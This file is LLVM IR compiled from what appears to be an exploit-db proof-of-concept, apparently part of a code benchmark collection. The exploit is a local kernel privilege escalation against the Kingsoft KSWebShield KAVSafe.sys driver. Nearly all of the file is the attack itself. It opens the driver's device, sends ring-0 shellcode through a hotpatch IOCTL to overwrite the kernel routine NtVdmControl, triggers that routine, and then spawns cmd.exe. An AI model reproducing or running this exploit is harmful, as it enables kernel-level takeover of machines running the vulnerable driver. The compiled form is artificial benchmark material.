; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_12710.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_12710.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_13__ = type { i64 }
%struct.TYPE_14__ = type { %struct.TYPE_10__* }
%struct.TYPE_10__ = type { %struct.TYPE_9__ }
%struct.TYPE_9__ = type { i32, i8* }
%struct.TYPE_12__ = type { %struct.TYPE_11__* }
%struct.TYPE_11__ = type { i32 }

@.str = private unnamed_addr constant [141 x i8] c"KSWebShield KAVSafe.sys <= 2010,04,14,609\0AKernel Mode Privilege Escalation Vulnerability Proof-of-Concept\0A2010-5-23\0ABy Lincoin \0A\0APress Enter\00", align 1
@MAX_PATH = common dso_local global i32 0, align 4
@HKEY_LOCAL_MACHINE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [25 x i8] c"SOFTWARE\\Kingsoft\\KSWSVC\00", align 1
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [12 x i32] [i32 80, i32 114, i32 111, i32 103, i32 114, i32 97, i32 109, i32 80, i32 97, i32 116, i32 104, i32 0], align 4
@.str.3 = private unnamed_addr constant [27 x i8] c"KSWebShield not installed\0A\00", align 1
@.str.4 = private unnamed_addr constant [13 x i32] [i32 92, i32 107, i32 97, i32 118, i32 105, i32 110, i32 115, i32 116, i32 46, i32 101, i32 120, i32 101, i32 0], align 4
@.str.5 = private unnamed_addr constant [10 x i8] c"ntdll.dll\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"NtQueryInformationProcess\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"\\\\.\\KAVSafe\00", align 1
@FILE_READ_ATTRIBUTES = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [23 x i8] c"cannot open device %u\0A\00", align 1
@.str.9 = private unnamed_addr constant [25 x i8] c"NtQuerySystemInformation\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"cannot load ntoskrnl!\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"NtVdmControl\00", align 1
@.str.12 = private unnamed_addr constant [27 x i8] c"cannot find NtVdmControl!\0A\00", align 1
@.str.13 = private unnamed_addr constant [20 x i8] c"NtVdmControl = %08x\00", align 1
@NopNop = common dso_local global i64 0, align 8
@R0ShellCodeXP = common dso_local global i64 0, align 8
@__const.main.ModuleName = private unnamed_addr constant [68 x i8] c"ntoskrnl.exe\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@IOCTL_HOTPATCH_KERNEL_MODULE = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [29 x i8] c"cannot device io control!%u\0A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"cmd.exe\00", align 1
@SW_SHOW = common dso_local global i32 0, align 4
@.str.16 = private unnamed_addr constant [6 x i8] c"OK!\0A \00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.TYPE_13__, align 8
  %15 = alloca i32 (i32, i32, %struct.TYPE_13__*, i32, i32*)*, align 8
  %16 = alloca %struct.TYPE_14__*, align 8
  %17 = alloca i64, align 8
  %18 = alloca i32 (i32, %struct.TYPE_12__*, i32, i32*)*, align 8
  %19 = alloca %struct.TYPE_12__, align 8
  %20 = alloca i64, align 8
  %21 = alloca i64, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i64, align 8
  %25 = alloca [68 x i8], align 16
  %26 = alloca i32, align 4
  %27 = alloca i32 (i32, i32)*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str, i64 0, i64 0))
  %29 = load i32, i32* @MAX_PATH, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %7, align 8
  %32 = alloca i8, i64 %30, align 16
  store i64 %30, i64* %8, align 8
  %33 = load i32, i32* @MAX_PATH, align 4
  %34 = sext i32 %33 to i64
  %35 = mul i64 %34, 1
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %10, align 4
  store i64 0, i64* %12, align 8
  %37 = load i32, i32* @HKEY_LOCAL_MACHINE, align 4
  %38 = call i64 @RegOpenKey(i32 %37, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i32* %6)
  %39 = load i64, i64* @ERROR_SUCCESS, align 8
  %40 = icmp eq i64 %38, %39
  br i1 %40, label %41, label %55

41:                                               ; preds = %2
  %42 = load i32, i32* %6, align 4
  %43 = ptrtoint i8* %32 to i32
  %44 = call i64 @RegQueryValueExW(i32 %42, i8* bitcast ([12 x i32]* @.str.2 to i8*), i32* null, i32* %9, i32 %43, i32* %10)
  %45 = load i64, i64* @ERROR_SUCCESS, align 8
  %46 = icmp ne i64 %44, %45
  br i1 %46, label %47, label %52

47:                                               ; preds = %41
  %48 = load i32, i32* %6, align 4
  %49 = call i32 @RegCloseKey(i32 %48)
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %51 = call i32 (...) @getchar()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %246

52:                                               ; preds = %41
  %53 = load i32, i32* %6, align 4
  %54 = call i32 @RegCloseKey(i32 %53)
  br label %58

55:                                               ; preds = %2
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %57 = call i32 (...) @getchar()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %246

58:                                               ; preds = %52
  %59 = call i32 @wcscat(i8* %32, i8* bitcast ([13 x i32]* @.str.4 to i8*))
  %60 = call i64 @GetModuleHandle(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %61 = call i64 @GetProcAddress(i64 %60, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0))
  %62 = inttoptr i64 %61 to i32 (i32, i32, %struct.TYPE_13__*, i32, i32*)*
  store i32 (i32, i32, %struct.TYPE_13__*, i32, i32*)* %62, i32 (i32, i32, %struct.TYPE_13__*, i32, i32*)** %15, align 8
  %63 = load i32 (i32, i32, %struct.TYPE_13__*, i32, i32*)*, i32 (i32, i32, %struct.TYPE_13__*, i32, i32*)** %15, align 8
  %64 = call i32 (...) @NtCurrentProcess()
  %65 = call i32 %63(i32 %64, i32 0, %struct.TYPE_13__* %14, i32 8, i32* null)
  %66 = getelementptr inbounds %struct.TYPE_13__, %struct.TYPE_13__* %14, i32 0, i32 0
  %67 = load i64, i64* %66, align 8
  %68 = inttoptr i64 %67 to %struct.TYPE_14__*
  store %struct.TYPE_14__* %68, %struct.TYPE_14__** %16, align 8
  %69 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %70 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %69, i32 0, i32 0
  %71 = load %struct.TYPE_10__*, %struct.TYPE_10__** %70, align 8
  %72 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %71, i32 0, i32 0
  %73 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 8
  store i32 %74, i32* %11, align 4
  %75 = call i32 @wcslen(i8* %32)
  %76 = sext i32 %75 to i64
  %77 = mul i64 %76, 1
  %78 = trunc i64 %77 to i32
  %79 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %80 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %79, i32 0, i32 0
  %81 = load %struct.TYPE_10__*, %struct.TYPE_10__** %80, align 8
  %82 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %82, i32 0, i32 0
  store i32 %78, i32* %83, align 8
  %84 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %85 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %84, i32 0, i32 0
  %86 = load %struct.TYPE_10__*, %struct.TYPE_10__** %85, align 8
  %87 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %86, i32 0, i32 0
  %88 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = call i64 @malloc(i32 %89)
  store i64 %90, i64* %12, align 8
  %91 = load i64, i64* %12, align 8
  %92 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %93 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %92, i32 0, i32 0
  %94 = load %struct.TYPE_10__*, %struct.TYPE_10__** %93, align 8
  %95 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %94, i32 0, i32 0
  %96 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %95, i32 0, i32 1
  %97 = load i8*, i8** %96, align 8
  %98 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %99 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %98, i32 0, i32 0
  %100 = load %struct.TYPE_10__*, %struct.TYPE_10__** %99, align 8
  %101 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %100, i32 0, i32 0
  %102 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = call i32 @RtlCopyMemory(i64 %91, i8* %97, i32 %103)
  %105 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %106 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %105, i32 0, i32 0
  %107 = load %struct.TYPE_10__*, %struct.TYPE_10__** %106, align 8
  %108 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %107, i32 0, i32 0
  %109 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %108, i32 0, i32 1
  %110 = load i8*, i8** %109, align 8
  %111 = ptrtoint i8* %110 to i64
  %112 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %113 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %112, i32 0, i32 0
  %114 = load %struct.TYPE_10__*, %struct.TYPE_10__** %113, align 8
  %115 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %114, i32 0, i32 0
  %116 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %115, i32 0, i32 0
  %117 = load i32, i32* %116, align 8
  %118 = call i32 @RtlCopyMemory(i64 %111, i8* %32, i32 %117)
  %119 = load i32, i32* @FILE_READ_ATTRIBUTES, align 4
  %120 = load i32, i32* @FILE_SHARE_READ, align 4
  %121 = load i32, i32* @OPEN_EXISTING, align 4
  %122 = call i64 @CreateFile(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0), i32 %119, i32 %120, i32 0, i32 %121, i32 0, i32 0)
  store i64 %122, i64* %17, align 8
  %123 = load i64, i64* %17, align 8
  %124 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %125 = icmp eq i64 %123, %124
  br i1 %125, label %126, label %130

126:                                              ; preds = %58
  %127 = call i32 (...) @GetLastError()
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i64 0, i64 0), i32 %127)
  %129 = call i32 (...) @getchar()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %246

130:                                              ; preds = %58
  %131 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %132 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %131, i32 0, i32 0
  %133 = load %struct.TYPE_10__*, %struct.TYPE_10__** %132, align 8
  %134 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %133, i32 0, i32 0
  %135 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %134, i32 0, i32 1
  %136 = load i8*, i8** %135, align 8
  %137 = ptrtoint i8* %136 to i64
  %138 = load i64, i64* %12, align 8
  %139 = inttoptr i64 %138 to i8*
  %140 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %141 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %140, i32 0, i32 0
  %142 = load %struct.TYPE_10__*, %struct.TYPE_10__** %141, align 8
  %143 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %142, i32 0, i32 0
  %144 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %143, i32 0, i32 0
  %145 = load i32, i32* %144, align 8
  %146 = call i32 @RtlCopyMemory(i64 %137, i8* %139, i32 %145)
  %147 = load i32, i32* %11, align 4
  %148 = load %struct.TYPE_14__*, %struct.TYPE_14__** %16, align 8
  %149 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %148, i32 0, i32 0
  %150 = load %struct.TYPE_10__*, %struct.TYPE_10__** %149, align 8
  %151 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %151, i32 0, i32 0
  store i32 %147, i32* %152, align 8
  %153 = call i64 @GetModuleHandle(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %154 = call i64 @GetProcAddress(i64 %153, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0))
  %155 = inttoptr i64 %154 to i32 (i32, %struct.TYPE_12__*, i32, i32*)*
  store i32 (i32, %struct.TYPE_12__*, i32, i32*)* %155, i32 (i32, %struct.TYPE_12__*, i32, i32*)** %18, align 8
  %156 = load i32 (i32, %struct.TYPE_12__*, i32, i32*)*, i32 (i32, %struct.TYPE_12__*, i32, i32*)** %18, align 8
  %157 = call i32 %156(i32 11, %struct.TYPE_12__* %19, i32 8, i32* null)
  %158 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %19, i32 0, i32 0
  %159 = load %struct.TYPE_11__*, %struct.TYPE_11__** %158, align 8
  %160 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %159, i64 0
  %161 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 4
  %163 = call i64 @strrchr(i32 %162, i8 signext 92)
  %164 = add nsw i64 %163, 1
  %165 = call i64 @LoadLibrary(i64 %164)
  store i64 %165, i64* %20, align 8
  %166 = load i64, i64* %20, align 8
  %167 = icmp eq i64 %166, 0
  br i1 %167, label %168, label %171

168:                                              ; preds = %130
  %169 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0))
  %170 = call i32 (...) @getchar()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %246

171:                                              ; preds = %130
  %172 = load i64, i64* %20, align 8
  %173 = call i64 @GetProcAddress(i64 %172, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  store i64 %173, i64* %21, align 8
  %174 = load i64, i64* %21, align 8
  %175 = icmp eq i64 %174, 0
  br i1 %175, label %176, label %179

176:                                              ; preds = %171
  %177 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.12, i64 0, i64 0))
  %178 = call i32 (...) @getchar()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %246

179:                                              ; preds = %171
  %180 = load i64, i64* %21, align 8
  %181 = trunc i64 %180 to i32
  %182 = load i64, i64* %20, align 8
  %183 = trunc i64 %182 to i32
  %184 = sub nsw i32 %181, %183
  %185 = sext i32 %184 to i64
  store i64 %185, i64* %21, align 8
  %186 = load i64, i64* %21, align 8
  %187 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.13, i64 0, i64 0), i64 %186)
  %188 = call i32 (...) @getchar()
  %189 = load i64, i64* @NopNop, align 8
  %190 = trunc i64 %189 to i32
  %191 = load i64, i64* @R0ShellCodeXP, align 8
  %192 = trunc i64 %191 to i32
  %193 = sub nsw i32 %190, %192
  store i32 %193, i32* %22, align 4
  %194 = load i64, i64* @R0ShellCodeXP, align 8
  %195 = trunc i64 %194 to i32
  store i32 %195, i32* %23, align 4
  %196 = load i32, i32* %22, align 4
  %197 = add nsw i32 72, %196
  %198 = call i64 @malloc(i32 %197)
  store i64 %198, i64* %24, align 8
  %199 = load i64, i64* %24, align 8
  %200 = trunc i64 %199 to i32
  %201 = add nsw i32 %200, 72
  %202 = sext i32 %201 to i64
  %203 = load i64, i64* @R0ShellCodeXP, align 8
  %204 = load i32, i32* %22, align 4
  %205 = call i32 @CopyMemory(i64 %202, i64 %203, i32 %204)
  %206 = bitcast [68 x i8]* %25 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %206, i8* align 16 getelementptr inbounds ([68 x i8], [68 x i8]* @__const.main.ModuleName, i32 0, i32 0), i64 68, i1 false)
  %207 = load i64, i64* %24, align 8
  %208 = getelementptr inbounds [68 x i8], [68 x i8]* %25, i64 0, i64 0
  %209 = call i32 @RtlCopyMemory(i64 %207, i8* %208, i32 68)
  %210 = load i64, i64* %21, align 8
  %211 = trunc i64 %210 to i32
  %212 = load i64, i64* %24, align 8
  %213 = trunc i64 %212 to i32
  %214 = add nsw i32 %213, 64
  %215 = sext i32 %214 to i64
  %216 = inttoptr i64 %215 to i32*
  store i32 %211, i32* %216, align 4
  %217 = load i32, i32* %22, align 4
  %218 = load i64, i64* %24, align 8
  %219 = trunc i64 %218 to i32
  %220 = add nsw i32 %219, 68
  %221 = sext i32 %220 to i64
  %222 = inttoptr i64 %221 to i32*
  store i32 %217, i32* %222, align 4
  %223 = load i64, i64* %17, align 8
  %224 = load i32, i32* @IOCTL_HOTPATCH_KERNEL_MODULE, align 4
  %225 = load i64, i64* %24, align 8
  %226 = load i32, i32* %22, align 4
  %227 = add nsw i32 72, %226
  %228 = call i32 @DeviceIoControl(i64 %223, i32 %224, i64 %225, i32 %227, i32* null, i32 0, i32* %26, i32 0)
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %234, label %230

230:                                              ; preds = %179
  %231 = call i32 (...) @GetLastError()
  %232 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.14, i64 0, i64 0), i32 %231)
  %233 = call i32 (...) @getchar()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %246

234:                                              ; preds = %179
  %235 = load i64, i64* %17, align 8
  %236 = call i32 @CloseHandle(i64 %235)
  %237 = call i64 @GetModuleHandle(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %238 = call i64 @GetProcAddress(i64 %237, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  %239 = inttoptr i64 %238 to i32 (i32, i32)*
  store i32 (i32, i32)* %239, i32 (i32, i32)** %27, align 8
  %240 = load i32 (i32, i32)*, i32 (i32, i32)** %27, align 8
  %241 = call i32 %240(i32 0, i32 0)
  %242 = load i32, i32* @SW_SHOW, align 4
  %243 = call i32 @WinExec(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0), i32 %242)
  %244 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.16, i64 0, i64 0))
  %245 = call i32 (...) @getchar()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %246

246:                                              ; preds = %234, %230, %176, %168, %126, %55, %47
  %247 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %247)
  %248 = load i32, i32* %3, align 4
  ret i32 %248
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i64 @RegOpenKey(i32, i8*, i32*) #1

declare dso_local i64 @RegQueryValueExW(i32, i8*, i32*, i32*, i32, i32*) #1

declare dso_local i32 @RegCloseKey(i32) #1

declare dso_local i32 @getchar(...) #1

declare dso_local i32 @wcscat(i8*, i8*) #1

declare dso_local i64 @GetProcAddress(i64, i8*) #1

declare dso_local i64 @GetModuleHandle(i8*) #1

declare dso_local i32 @NtCurrentProcess(...) #1

declare dso_local i32 @wcslen(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @RtlCopyMemory(i64, i8*, i32) #1

declare dso_local i64 @CreateFile(i8*, i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i64 @LoadLibrary(i64) #1

declare dso_local i64 @strrchr(i32, i8 signext) #1

declare dso_local i32 @CopyMemory(i64, i64, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @DeviceIoControl(i64, i32, i64, i32, i32*, i32, i32*, i32) #1

declare dso_local i32 @CloseHandle(i64) #1

declare dso_local i32 @WinExec(i8*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
